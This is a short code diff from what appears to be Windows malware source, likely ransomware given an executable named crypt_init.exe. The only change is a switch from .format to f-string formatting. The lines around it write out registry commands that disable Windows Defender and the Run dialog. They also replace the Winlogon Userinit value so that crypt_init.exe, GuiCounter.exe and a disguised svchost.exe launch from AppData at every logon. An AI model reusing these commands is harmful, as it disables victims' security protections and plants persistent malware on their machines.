@@ -15,7 +15,7 @@ class ManageKey():
         self.windef_path     = 'REG ADD "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware'
         self.path_win_r      = "REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun"
         self.unset_key       = 'REG DELETE "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit'
-        self.new_key         = "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\crypt_init.exe, {}\\Users\\{}\\AppData\\Roaming\\DriversManager\\GuiCounter.exe, {}\\Users\\{}\\AppData\\Roaming\\DriversManager\\svchost.exe, {}\\Windows\\system32\\userinit.exe".format(letter_drive, current_user, letter_drive, current_user, letter_drive, current_user, letter_drive)
+        self.new_key         = f"{letter_drive}\\Users\\{current_user}\\AppData\\Roaming\\DriversManager\\crypt_init.exe, {letter_drive}\\Users\\{current_user}\\AppData\\Roaming\\DriversManager\\GuiCounter.exe, {letter_drive}\\Users\\{current_user}\\AppData\\Roaming\\DriversManager\\svchost.exe, {letter_drive}\\Windows\\system32\\userinit.exe"
         self.force_cli       = "/f"
         self.key_type        = "/t REG_DWORD /d 1"
     # FUNCTION TO DEACTIVATE WINDEFENDER INTO REGISTRY    
